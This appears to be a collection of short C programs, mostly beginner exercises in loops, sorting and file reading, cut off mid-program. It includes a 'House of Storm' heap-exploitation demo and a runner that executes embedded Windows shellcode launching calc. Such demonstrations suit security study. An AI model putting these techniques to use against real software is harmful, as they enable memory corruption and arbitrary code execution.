    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <math.h>\n\n\nint main(int argc, char const *argv[]){\n if( argc < 4 ){\n  printf(\"Entre com o nome dos 2 arquivos e o tamanho de colunas\\n\");\n }\n int flag = 0;\n FILE* arq1 = fopen(argv[1], \"r\");\n FILE* arq2 = fopen(argv[2], \"r\");\n int colunas = atoi(argv[3]);\n float f1;\n float f2;\n float dif;\n int cont=0;\n while(!feof(arq1)) {\n  fscanf(arq1,\"%f,\", &f1);\n  fscanf(arq2,\"%f,\", &f2);\n  dif = f1 - f2;\n  cont++;\n  if( ( (dif) >= 0 ? (dif) : -(dif) ) > 1e-5 ){\n   printf(\" [%d,%d] %6.3f & %6.3f \\n\",cont / colunas,cont % colunas,f1,f2);\n   flag = 1;\n  }\n }\n if (!flag) printf(\"Tudo Ok! =)\\n\");\n return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main(){\n char str[20 +1];\n int i, cont, exit;\n scanf(\"%s\", str);\n for(i=0, exit = 1, cont = 0; str[i]!='\\0' && exit; i++){\n  if(str[i] == '(')\n   cont++;\n  else if(str[i] == ')')\n   cont--;\n  else\n   exit = 0;\n  if(cont < 0)\n   exit = 0;\n }\n if(exit && cont==0)\n  printf(\"Corretta\\n\");\n else\n  printf(\"Errore\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char **argv)\n{\n  printf(\"1st: %s\\n\", *argv);\n  printf(\"2nd: %s\\n\", *(argv + 1));\n  return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int a,b,i,GCD;\n    printf(\"Please enter two integer values \\n\");\n    scanf(\"%d %d\", &a, &b);\n    for(i=1;i<a && i<=b; i++)\n    {\n        if(a%i==0 && b%i==0)\n        GCD =i;\n    }\n    printf(\"GCD of %d and %d is %d\", a,b, GCD);\n    return 0;\n}",
    "int printf(const char *, ...);\n\nint foo(n, a)\nint a[31][42];\nint n;\n{\n return sizeof(a) + sizeof(a[14]) + n;\n}\nint main(void) {\n int a[2][42] = {0};\n return printf(\"%d\\n\", foo(42, a));\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n  int c;\n  long freqarr[256 + 1];\n  long thisval = 0;\n  long maxval = 0;\n  int thisidx = 0;\n  for(thisidx = 0; thisidx <= 256; thisidx++)\n  {\n    freqarr[thisidx] = 0;\n  }\n  while((c = getchar()) != (-1))\n  {\n    if(c < 256)\n    {\n      thisval = ++freqarr[c];\n      if(thisval > maxval)\n      {\n        maxval = thisval;\n      }\n    }\n    else\n    {\n      thisval = ++freqarr[256];\n      if(thisval > maxval)\n      {\n        maxval = thisval;\n      }\n    }\n  }\n  for(thisval = maxval; thisval > 0; thisval--)\n  {\n    printf(\"%4d  |\", thisval);\n    for(thisidx = 0; thisidx <= 256; thisidx++)\n    {\n      if(freqarr[thisidx] >= thisval)\n      {\n        printf(\"*\");\n      }\n      else if(freqarr[thisidx] > 0)\n      {\n        printf(\" \");\n      }\n    }\n    printf(\"\\n\");\n  }\n  printf(\"      +\");\n  for(thisidx = 0; thisidx <= 256; thisidx++)\n  {\n    if(freqarr[thisidx] > 0)\n    {\n      printf(\"-\");\n    }\n  }\n  printf(\"\\n       \");\n  for(thisidx = 0; thisidx < 256; thisidx++)\n  {\n    if(freqarr[thisidx] > 0)\n    {\n      printf(\"%d\", thisidx / 100);\n    }\n  }\n  printf(\"\\n       \");\n  for(thisidx = 0; thisidx < 256; thisidx++)\n  {\n    if(freqarr[thisidx] > 0)\n    {\n      printf(\"%d\", (thisidx - (100 * (thisidx / 100))) / 10 );\n    }\n  }\n  printf(\"\\n       \");\n  for(thisidx = 0; thisidx < 256; thisidx++)\n  {\n    if(freqarr[thisidx] > 0)\n    {\n      printf(\"%d\", thisidx - (10 * (thisidx / 10)));\n    }\n  }\n  if(freqarr[256] > 0)\n  {\n    printf(\">%d\\n\", 256);\n  }\n  printf(\"\\n\");\n  return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int c, d;\n float a, b = -999;\n printf(\"How many float value(s) to input : \");\n scanf(\"%d\", &c);\n printf(\"Enter %d float value(s) : \", c);\n for (d = 1; d <= c; d++)\n {\n  scanf(\"%f\", &a);\n  if (b<a)\n   b = a;\n }\n printf(\"\\nMax value : %.2f\\n\", b);\n return 0;\n}",
    "#include <stdio.h>\nint main ()\n{\n unsigned int a;\n scanf(\"%u\",&a);\n printf(\"%u\",a);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int count=5;\n while(count<10) {printf(\"The While count is %d \\n\",count);count+=1;}\n do{printf(\"The Do-While count is %d \\n\",count);count+=1;}while(count<10);\n}",
    "int addition (int a, int b) {\n return a + b;\n}\nint subtraction(int a, int b) {\n return addition(b, a);\n}\nint main () {\n return subtraction(20, 10);\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint fibo(int);\nint main(){\n    int n;\n    printf(\"Type n: \");\n    scanf(\"%i\",&n);\n    printf(\"F(%d)=%d\", n, fibo(n));\n    return 0;\n}\nint fibo(int n){\n    if (n==0) return 0;\n    if (n==1) return 1;\n    return fibo(n-1)+fibo(n-2);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid selection_sort(int* array, size_t size){\n    int tmp, min_index;\n    for(int i = 0; i < (size - 1); i++){\n        min_index = i;\n        for(int j = (i + 1); j < size; j++){\n            if(array[j] < array[min_index])\n                min_index = j;\n        }\n        tmp = array[i];\n        array[i] = array[min_index];\n        array[min_index] = tmp;\n    }\n}\nint main(){\n    int array[] = {3, 2, -3, 9, 2, 0};\n    for(int i = 0; i < 6; i++)\n        printf(\"%d \", array[i]);\n    selection_sort(array, 6);\n    printf(\"\\nSorted:\\n\");\n    for(int i = 0; i < 6; i++)\n        printf(\"%d \", array[i]);\n    printf(\"\\n\");\n}",
    "#include<stdio.h>\n#include<math.h>\n\nint main(int argc, char const *argv[])\n{\n    printf(\"%g\\n\",\n        pow(sin(3.14159265/4),2) +\n        sin(3.14159265/4) *\n        cos(3.14159265/4) -\n        pow(cos(3.14159265/4),2)\n    );\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main () {\n int numberOfBottles;\n printf(\"Enter a number of bottles: \");\n scanf(\"%d\", &numberOfBottles);\n double sum = 0.0;\n while(numberOfBottles>0){\n     double litres;\n     printf(\"Enter the size: \");\n     scanf(\"%lf\",&litres);\n     if(litres<=1.0){\n      sum = sum + 0.10;\n  }\n  else{\n   sum+= 0.25;\n  }\n     numberOfBottles-=1;\n    }\n    printf(\"The price you are reciving is: $%0.2f\\n\",sum);\n}",
    "#include <stdio.h>\nint factorial(int n)\n{\n    if (n == 0) {\n        return 1;\n    }\n    return factorial(n - 1) * n;\n}\nint nCr(int n, int r)\n{\n    int num, den;\n    num = factorial(n);\n    den = factorial(r) * factorial(n - r);\n    return num / den;\n}\nint nCr_tringle(int n, int r)\n{\n    if (r == 0 || n == r) {\n        return 1;\n    }\n    return nCr_tringle(n - 1, r - 1) + nCr_tringle(n - 1, r);\n}\nint main () {\n    int n = 4;\n    int r = 2;\n    printf(\"Factorial:\\tCombination of n %d C r %d is: %d\\n\", n, r, nCr(n, r));\n    printf(\"Recursion:\\tCombination of n %d C r %d is: %d\\n\", n, r, nCr_tringle(n, r));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int ti[1000];\n    int a,b,c,t,n,i,sum=0;\n    scanf (\"%d %d %d %d %d\",&n,&a,&b,&c,&t);\n    for ( i=0;i<n;i++ )\n        scanf(\"%d\",&ti[i]);\n    if (b >= c)\n         sum = a * n;\n    else\n    {\n        for ( i=0;i<n;i++ )\n        {\n            sum += (a-b*(t-ti[i])) + c*(t-ti[i]);\n        }\n    }\n    printf(\"%d\\n\",sum);\n    return 0;\n}",
    "#include <stdio.h>\nvoid findDistinctCount(int a[], int n, int k)\n{\n for (int x = 0; x <= n - k; x++)\n {\n  int distinct = 0;\n  for (int i = x; i < x + k; i++)\n  {\n   distinct++;\n   for (int j = x; j < i; j++)\n   {\n    if (a[i] == a[j])\n    {\n     distinct--;\n     break;\n    }\n   }\n  }\n  printf(\"No.of distinct elements in the sub-array [%d, %d] \"\n    \"is %d\\n\", x, x + k - 1, distinct);\n }\n}\nint main(void)\n{\n int ar[] = { 2, 1, 2, 3, 2, 1, 4, 5 };\n int k = 5;\n int n = sizeof(ar) / sizeof(ar[0]);\n findDistinctCount(ar, n, k);\n return 0;\n}",
    "#include <stdio.h>\nvoid foo()\n{\n char ch[10];\n printf(\"Calling from fucntion\");\n}\nint main()\n{\n foo();\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n char color[31];\n int weight;\n int count;\n int total_count=0;\n    FILE *fp = fopen(\"dumbbells.txt\", \"r\");\n if(fp == ((void*)0)){\n  printf(\"Error opening file.\");\n  return 1;\n }\n while(!feof(fp) && !ferror(fp)){\n  if(fscanf(fp, \"%d%s%d\", &weight, color, &count)== 3){\n   printf(\"%d\\t%s\\t%d\\n\", weight, color, count);\n   total_count += count;\n  }\n }\n printf(\"There are %d number of dumbbells in total.\\n\", total_count);\n fclose(fp);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int criminals;\n    scanf(\"%d\", &criminals);\n    if (criminals < 5) puts(\"I got this!\");\n    else if (criminals < 11) puts(\"Help me Batman\");\n    else puts(\"Good Luck out there!\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid center_text(int width, char *text)\n{\n int len,indent,s;\n len = strlen(text);\n indent = (width-len)/2;\n for( s=0; s<indent; s++ )\n  putchar(' ');\n printf(\"%s\\n\",text);\n}\nint main()\n{\n char *title[] = {\n    \"March Sales\",\n    \"My First Project\",\n    \"Centering output is so much fun!\",\n    \"This title is very long, just to see whether the code can handle such a long title\"\n };\n int x;\n for( x=0; x<4; x++ )\n {\n  center_text( 80, title[x] );\n }\n return(0);\n}",
    "#include <stdio.h>\nint main(){\n    int i, repeticoes;\n    printf(\"Digite a quantidade de repeticoes: \");\n    scanf(\"%d\", &repeticoes);\n    i = 1;\n    while(i <= repeticoes){\n        printf(\"%d\\n\", i);\n        i = i + 1;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main(){\n  char string[1000000];\n  int count, i;\n  printf(\"Enter an abitrarily long string, ending with carriage return > \");\n  scanf(\"%s\", string);\n  count = 0;\n  for(i=0; i != strlen(string); ++i){\n    count += (int)string[i];\n  }\n  count = count%64+' ';\n  printf(\"Check sum is %c\\n\", count);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i, j, input, res;\n    printf(\"Press 0 to print tringular pattern and 1 for reverse tringular pattern: \\n\");\n    scanf(\"%d\", &input);\n    printf(\"Enter number of rows to print in pattern: \");\n    scanf(\"%d\", &res);\n    const int rest = res;\n    if (input == 0)\n    {\n        for(i=1;i<=res;i++)\n        {\n            for(j=1;j<=i;j++)\n            {\n                printf(\"*\");\n            }\n            printf(\"\\n\");\n        }\n    }\n    else\n    {\n        for(i=1;i<=rest;i++)\n        {\n            res--;\n            for(j=1;j<=res+1;j++)\n            {\n                printf(\"*\");\n            }\n            printf(\"\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int qntd, minx, maxx, miny, maxy;\n    printf(\"Informe quantos pontos: [x,y]\\n\");\n    scanf(\"%d\", &qntd);\n    int cord[qntd][2];\n    for(int i=0; i<qntd; i++){\n        printf(\"Digite a %d: x y\\n\", i+1);\n        scanf(\"%d %d\", &cord[i][0], &cord[i][1]);\n        if(i==0){\n            minx = cord[i][0];\n            maxx = cord[i][0];\n            miny = cord[i][1];\n            maxx = cord[i][1];\n        }\n        if(cord[i][0]<minx) minx = cord[i][0];\n        if(cord[i][0]<maxx) maxx = cord[i][0];\n        if(cord[i][1]<miny) miny = cord[i][1];\n        if(cord[i][1]<maxy) maxx = cord[i][1];\n    }\n    printf(\"Ponto Min: [%d,%d]\\nPonto Max [%d,%d]\\n\", minx, miny, maxx,maxy);\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <regex.h>\nint main()\n{\n  regex_t exp;\n  regmatch_t ms[2];\n  regcomp(&exp, \" [=f!]{3} \", 1);\n  int i;\n  int r;\n  char *s;\n  s = \"toto === nada\";\n  r = regexec(&exp, s, 2, ms, 0);\n  printf(\"\\\"%s\\\" match ? %s\\n\", s, (r == 0 ? \"yes\" : \"no\"));\n  for (i = 0; ; i++)\n  {\n    if (ms[i].rm_so < 0) break;\n    printf(\"ms[%d]: so:%d, eo:%d\\n\", i, ms[i].rm_so, ms[i].rm_eo);\n    printf(\">%s< (%d)\\n\", s + ms[i].rm_so, ms[i].rm_eo);\n  }\n  regfree(&exp);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n\n\nint main() {\n    float D = 1 * pow(10, -13);\n    float t = 3625;\n    float x = 0.0001;\n    float C = 2 * pow(10,19);\n    float Q = ((C / pow(2.71828182846, ((-x * x)/(4 * D * t) ))) * sqrt(3.14159265359 * D * t));\n    printf(\" Your dose is %e cm^-2\\n\", Q);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int num1, num2;\n  printf(\"Enter num1 and num2>>> \");\n  scanf(\"%d %d\", &num1, &num2);\n  const int total = num1 + num2;\n  const float average = total / 2.0;\n  printf(\"Average : %.2f\\n\", average);\n  return 0;\n}",
    "#include <limits.h>\nint main(void) {\n      int s = sizeof(int) * 8;\n      1 >> s;\n      return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    int n,i,j;\n    printf(\"Input no of points:\");\n    scanf(\"%d\",&n);\n    n--;\n    float x[n+1],a[n+1];\n    float b[n],c[n];\n    printf(\"Input values of x:\\n\");\n    for (i=0;i<n+1;++i)\n        scanf(\"%f\",&x[i]);\n    printf(\"Input values of corresponding f(x):\\n\");\n    for (i=0;i<n+1;++i)\n        scanf(\"%f\",&a[i]);\n    b[0]=0;\n    for (j=0;j<=n-2;++j) {\n        b[j+1]=-b[j]+2*((a[j+1]-a[j])/(x[j+1]-x[j]));\n    }\n    for (j=0;j<=n-2;++j) {\n        c[j]=((b[j+1]-b[j])/(2*(x[j+1]-x[j])));\n    }\n    c[n-1]=(a[n]-a[n-1])/(pow((x[n]-x[n-1]),2))-b[n-1]/(x[n]-x[n-1]);\n    printf(\"i\\tai\\tbi\\tci\\n\");\n    for (i=0;i<n;++i)\n        printf(\"%d\\t%.2f\\t%.2f\\t%.2f\\n\",i,a[i],b[i],c[i]);\n}",
    "#include <stdio.h>\nint main()\n{\n    int i;\n    printf(\"Enter a number: \");\n    scanf(\"%d\", &i);\n    if(i % 2 == 0)\n    printf(\"Number is even\");\n    else if(i % 2 == 1)\n    printf(\"Number is odd\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar filler[0x60];\nchar target[0x60];\nvoid init(){\n        setvbuf((stdout), ((void*)0), 2, 0);\n        setvbuf((stdin), ((void*)0), 2, 0);\n        clearenv();\n}\nint get_shift_amount(char* pointer){\n int shift_amount = 0;\n long long ptr = (long long)pointer;\n while(ptr > 0x20){\n  ptr = ptr >> 8;\n  shift_amount += 1;\n }\n return shift_amount - 1;\n}\nint main(){\n init();\n        char *unsorted_bin, *large_bin, *fake_chunk, *ptr;\n int* tcaches[7];\n puts(\"House of Storm\");\n puts(\"======================================\");\n puts(\"Preparing chunks for the exploit\");\n puts(\"Put one chunk into unsorted bin and the other into the large bin\");\n puts(\"The unsorted bin chunk MUST be larger than the large bin chunk.\");\n unsorted_bin = malloc ( 0x4e8 );\n malloc ( 0x18 );\n puts(\"Find the proper chunk size to allocate.\");\n puts(\"Must be exactly the size of the written chunk from above.\");\n int shift_amount = get_shift_amount(unsorted_bin);\n printf(\"Shift Amount: %d\\n\", shift_amount);\n size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);\n if(alloc_size < 0x10){\n  printf(\"Chunk Size: 0x%lx\\n\", alloc_size);\n  puts(\"Chunk size is too small\");\n  exit(1);\n }\n alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10;\n printf(\"In this case, the chunk size is 0x%lx\\n\", alloc_size);\n        if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){\n                puts(\"Allocation size has bit 4 of the size set or \");\n  puts(\"mmap and non-main arena bit check will fail\");\n                puts(\"Please try again! :)\");\n                puts(\"Exiting...\");\n                return 1;\n        }\n if(alloc_size < 0x410){\n  puts(\"Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)\");\n  puts(\"Done to prevent usage of TCache stashing\");\n  for(int i = 0; i < 7; i++){\n   tcaches[i] = malloc(alloc_size);\n  }\n  for(int i = 0; i < 7; i++){\n   free(tcaches[i]);\n  }\n }\n else{\n  puts(\"Not filling up the TCache\");\n }\n large_bin = malloc ( 0x4d8 );\n malloc ( 0x18 );\n free ( large_bin );\n free ( unsorted_bin );\n unsorted_bin = malloc(0x4e8);\n free(unsorted_bin);\n fake_chunk = target - 0x10;\n puts(\"Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\\n This is our target location to get from the allocator\");\n ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk;\n (( size_t *) large_bin )[1] = (size_t)fake_chunk + 8 ;\n puts(\"Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location\");\n puts(\"of your fake chunk.\");\n puts(\"Misalign the location in order to use the primitive as a SIZE value.\");\n puts(\"The 'offset' changes depending on if the binary is PIE (5) or not PIE (2).\");\n puts(\"Vulnerability #2!\");\n puts(\"Overwrite large bins bk->nextsize with the address to put our fake chunk size at.\");\n (( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount;\n puts(\"Make allocation of the size that the value will be written for.\");\n puts(\"Once the allocation happens, the madness begins\");\n puts(\"Once in the unsorted bin, the 'large bin' chunk will be used in orer to \");\n puts(\"write a fake 'size' value to the location of our target.\");\n puts(\"After this, the target will have a valid size.\");\n puts(\"Next, the unsorted bin will see that the chunk (in unsorted_bin->bk) has a valid\");\n puts(\"size and remove it from the bin.\");\n puts(\"With this, we have pulled out an arbitrary chunk!\");\n printf(\"String before: %s\\n\", target);\n printf(\"String pointer: %p\\n\", target);\n puts(\"Make a call to 'calloc' instead of 'malloc' in order to \");\n puts(\"not use the TCache on the allocation. Had to fill TCache\");\n puts(\"because stashing would prevent the exploit from working\");\n ptr = calloc(alloc_size, 1);\n strncpy(ptr, \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\", 0x58 - 1);\n printf(\"String after %s\\n\", target);\n printf(\"Fake chunk ptr: %p\\n\", ptr);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char *argv[])\n{\n  int i = 0, j = 0, k = 0;\n  char *a, *b, *c;\n  a = (char*) malloc(100);\n  b = (char*)malloc(100);\n  printf(\"Digite a primeira string:\");\n  scanf(\"%s\", a);\n  printf(\"Digite a segunda string:\");\n  scanf(\"%s\", b);\n  c = (char*) malloc(strlen(a) + strlen(b));\n  while (i < (strlen(a) + strlen(b))) {\n    if (j < strlen(a)) {\n      c[i] = a[j];\n      i += 1;\n      j += 1;\n    }\n    if (k < strlen(b)) {\n      c[i] = b[k];\n      i += 1;\n      k += 1;\n    }\n  }\n  c[i] = '\\0';\n  printf(\"%s\\n\", c);\n  free(a);\n  free(b);\n  return 0;\n}",
    "int main()\n{\n int i;\n int num = 0;\n for (i = 0; i < 199999; i++)\n {\n  num++;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[]) {\n  if(argc < 2){\n    printf(\"Empty Input!\\n\");\n    return 0;\n  }\n  FILE * fp = fopen(argv[1],\"r\");\n  int total = 0;\n  char c;\n  if(fp == ((void*)0)){\n    printf(\"Can not found %s\\n\",argv[1]);\n    return 0;\n  }\n  while(feof(fp)==0){\n    fscanf(fp, \"%c\", &c);\n    if(c==';') total++;\n  }\n  printf(\"There are %d lines in %s.\\n\",total,argv[1]);\n  fclose(fp);\n  return 0;\n}",
    "#include <stdio.h>\n\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Woverlength-strings\"\n\nunsigned int example_sz = 128;\nchar *example_code =\n\"\\x55\\x48\\x83\\xec\\x40\\x65\\x48\\x8b\\x34\\x25\\x60\\x00\\x00\\x00\\x48\\x8b\"\n\"\\x76\\x18\\x48\\x8b\\x76\\x10\\x48\\x8b\\x36\\x48\\x8b\\x36\\x48\\x8b\\x7e\\x30\"\n\"\\x48\\x31\\xd2\\x48\\xc7\\xc2\\x60\\x00\\x00\\x00\\x03\\x57\\x3c\\x8b\\x5c\\x17\"\n\"\\x28\\x8b\\x74\\x1f\\x20\\x48\\x01\\xfe\\x8b\\x54\\x1f\\x24\\x0f\\xb7\\x2c\\x17\"\n\"\\x8d\\x52\\x02\\xad\\x49\\xb8\\x57\\x69\\x6e\\x45\\x78\\x65\\x63\\x00\\x4c\\x39\"\n\"\\x04\\x07\\x75\\xe8\\x8b\\x74\\x1f\\x1c\\x48\\x01\\xfe\\x8b\\x34\\xae\\x48\\x01\"\n\"\\xf7\\x99\\x48\\x8d\\x0d\\x0f\\x00\\x00\\x00\\x48\\xc7\\xc2\\x05\\x00\\x00\\x00\"\n\"\\xff\\xd7\\x48\\x83\\xc4\\x40\\x5d\\xc3\\x63\\x61\\x6c\\x63\\x00\\x00\\x00\\x00\";\n\n#pragma GCC diagnostic pop\n\ntypedef void (*t_shell_func)(void);\nint main(void)\n{\n    int ret = 0;\n    t_shell_func shell_func;\n    *(void **)(&shell_func) = example_code;\n    shell_func();\n    return ret;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(void)\n{\n unsigned char ix, iy, iz;\n double unidev;\n ix = 23456;\n iy = 13454;\n iz = 8992;\n unidev = ((171*ix)%30269) / 30269.0 + ((172*iy)%30307) / 30307.0 + ((170*iz)%30323) / 30323.0;\n unidev -= (int) unidev;\n printf(\"%f\\n\", unidev);\n return 0;\n}",
    "int main() {\n    int a = 90;\n    int b;\n    int c = 20;\n    int d = 0;\n    b = ++c + a++ - 11 + d--;\n    return b;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n    printf(\"=========================\\n\\n\");\n    system(\"./ex_system_2_bin\");\n    printf(\"\\n\\nProgramma terminato...\\n\");\n}",
    "#include <stddef.h>\nint main(void)\n{\n  int x;\n  x = *(int*)((void*)0);\n  return x;\n}",
    "#include <stdlib.h>\n#include <unistd.h>\nint main(int argc, const char *argv[])\n{\n for(;;) pause();\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv) {\n printf(\"This is AResMan!\\n\");\n}",
    "#include <stdio.h>\nvoid lower(char s[]);\nvoid upper(char s[]);\nint main(void)\n{\n  char s[] = \"Hey there YOU know this is CRAZY\";\n  char s2[] = \"THIS IS ONLY A TEST\";\n  lower(s);\n  printf(\"%s\\n\", s);\n  lower(s2);\n  printf(\"%s\\n\", s2);\n  upper(s);\n  printf(\"%s\\n\", s);\n  return 0;\n}\nvoid lower(char s[])\n{\n  char c;\n  int i = 0;\n  while ((c = s[i]) != '\\0') {\n    s[i] = (c > 64 && c < 91) ? c + 32 : c;\n    i++;\n  }\n}\nvoid upper(char s[])\n{\n  char c;\n  int i = 0;\n  while ((c = s[i]) != '\\0') {\n    s[i] = (c > 96 && c < 123) ? c - 32 : c;\n    i++;\n  }\n}",
    "void baz(void) {}\nvoid *y = (void *)baz;\nint main () { return 0; }",
    "#include <stdio.h>\n\nint main()\n{\n  int c;\n  int i = 0;\n  char s[10];\n  while (i < 10 - 1)\n    if ((c = getchar()) != '\\n')\n      if (c != (-1)) {\n        s[i] = c;\n        ++i;\n      }\n  s[i] = '\\0';\n  printf(\"%s\\n\", s);\n  return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nfloat f = 3.14;\nint *p = (int *)&f;\nint x = (int) f;\nprintf(\"%d\\n\", *p);\nprintf(\"%d\\n\", x);\nint *q ;\nint a = 10;\nq = &a;\nprintf(\"q is %d\\n\", *q);\nq++;\nprintf(\"q is %d\\n\", *q);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\nint board[8][8] = {{0}};\nint queen[8] = {0};\nvoid f_r();\nvoid p_r();\nint autoMove();\n_Bool iSafe(int c_q, int clm);\nint main()\n{\n    int val = 0;\n    board[0][val] = 1;\n    queen[0] = val;\n    autoMove(1);\n    p_r();\n    return 0;\n}\nint autoMove(int c_q)\n{\n    if(c_q == 8)\n    {\n        return 1;\n    }\n    int cnt;\n    for(cnt = 0; cnt < 8; cnt++)\n    {\n        queen[c_q] = cnt;\n        if(iSafe(c_q, cnt) == 1 )\n        {\n            board[c_q][cnt] = 1;\n            if(autoMove(c_q + 1) == 1)\n            {\n                return 1;\n            }\n            else\n            {\n                board[c_q][cnt] = 0;\n            }\n        }\n    }\n    return 0;\n}\n_Bool iSafe(int c_q, int clm)\n{\n    int cnt;\n    for(cnt = 0; cnt < c_q; cnt++)\n    {\n        if( clm == queen[cnt] || abs(clm - queen[cnt]) == abs(c_q - cnt) ){\n            return 0;\n        }\n    }\n    return 1;\n}\nvoid f_r()\n{\n    int k,j;\n    for(k = 0; k < 8; k++)\n    {\n        for(j = 0; k < 8; j++)\n        {\n            board[k][j] = 0x0;\n        }\n    }\n}\nvoid p_r()\n{\n    puts(\"\");\n    int k,j;\n    for(k = 0; k < 8; k++)\n    {\n        for(j = 0; j < 8; j++)\n        {\n            printf( board[k][j] ? \"[Q]\" : \"[ ]\" );\n        }\n        puts(\"\");\n    }\n    puts(\"\");\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    int counter;\n    printf(\"Program Name Is: %s\", argv[0]);\n    if (argc == 1)\n        printf(\"\\nNo Extra Command Line Argument Passed Other Than Program Name\");\n    if (argc >= 2)\n    {\n        printf(\"\\nNumber Of Arguments Passed: %d\", argc);\n        printf(\"\\n----Following Are The Command Line Arguments Passed----\");\n        for (counter = 0; counter < argc; counter++)\n            printf(\"\\nargv[%d]: %s\", counter, argv[counter]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void){\n  int x = 10;\n  int *a = &x;\n  printf(\"%i\\n\",x);\n  printf(\"%p\\n\",&x);\n  printf(\"%p\\n\",a);\n  printf(\"%p\\n\",&a);\n  printf(\"%i\\n\",*a);\n  return 0;\n}",
    "#include <stdlib.h>\nint main()\n{\n  int *p = malloc(sizeof(int) * 5);\n  int *p2 = p + 10;\n  int *p3 = p - 10;\n  int arr[5];\n  int *p4 = arr + 10;\n  int *p5 = arr - 10;\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    float vrms;\n    float vp;\n    float corrente;\n    const float resistencia=156;\n    printf(\"Calculo circuito AC\\n\\n\");\n    printf(\"Digite o valor rms da tensao :\");\n    scanf(\"%f\",&vrms);\n    printf(\"\\n\");\n    vp = vrms/0.707;\n    corrente = vrms / resistencia;\n    printf(\"Uma tensao senoidal com %.2f vrms tem %.2f V de pico\\n\\n\",vrms,vp);\n    printf(\"Colocada uma carga de %.2f ohms produz uma corrente de %.2f A\\n\",resistencia,corrente);\n}",
    "int main()\n{\n  int *a;\n  int b = 0;\n  a = &b;\n  return(0);\n}",
    "#include <stdio.h>\n\nint main()\n{\n    char s1[30];\n    int i;\n    printf(\"Input:\\n\");\n    scanf(\"%s\",&s1);\n    printf(\"Output:\\n\");\n    if (1)\n    {\n        for (i = 0; i < 30; i++)\n            if (s1[i] != '\\0')\n            {\n                if (s1[i] != ' ')\n                {\n                    if (s1[i] >= 'a' && s1[i] <= 'z')\n                        s1[i] = s1[i]-32;\n                    else if (s1[i] >= 'A' || s1[i] <= 'Z')\n                        s1[i] += 32;\n                }\n            }\n    }\n    printf(\"%s\", s1);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main( int argc, char *argv[] )\n{\n if ( argc == 0 )\n  puts( \"Nema dostupne komandne linije.\" );\n else\n {\n  printf( \"Program koji se izvrsava: %s\\n\", argv[0] );\n  if ( argc == 1 )\n   puts( \"Nema argumenata preuzetih iz komandne linije.\" );\n  else\n  {\n   puts( \"Argumenti komandne linije su:\" );\n  for ( int i = 1; i < argc; ++i )\n   puts( argv[i] );\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main(int argc, char **argv) {\n    (void) argc;\n    (void) argv;\n    puts(\"hello world\");\n    sleep(0xFFFFFFFF);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint Matriz[200][200];\nvoid ler_matriz(){\n  int i, j, n;\n  scanf(\"%d\",&n);\n  for(i=0;i<n;i++)\n    for(j=0;j<n;j++)\n      scanf(\"%d\",&Matriz[i][j]);\n}\n\nint analisa_rota(int orig, int dest, int ngrupo, int hi, int hf, int k,int h) {\n  int nprobs = 0, u, v, ng, po=0, pd=0, d, ho, npessoas = ngrupo;\n  scanf(\"%d\",&u);\n  if (u == orig) {po = 1; ho = h;}\n  while(--k > 0 && pd == 0) {\n    scanf(\"%d%d%d\",&ng,&d,&v);\n    nprobs += Matriz[u-1][v-1];\n    h += d;\n    if (po == 1) {\n      npessoas = ((npessoas) < (ng)? (npessoas): (ng));\n      if (v == dest) { pd = 1; }\n    } else if (v == orig) { po = 1; ho = h;}\n    u = v;\n  }\n  while (k-- > 0)\n    scanf(\"%d%d%d\",&v,&v,&v);\n  if (po == 1 && pd == 1 && npessoas == ngrupo && h <= hf && ho >= hi)\n    return nprobs;\n  return -1;\n}\nint main() {\n  int origem, destino, ngrupo, 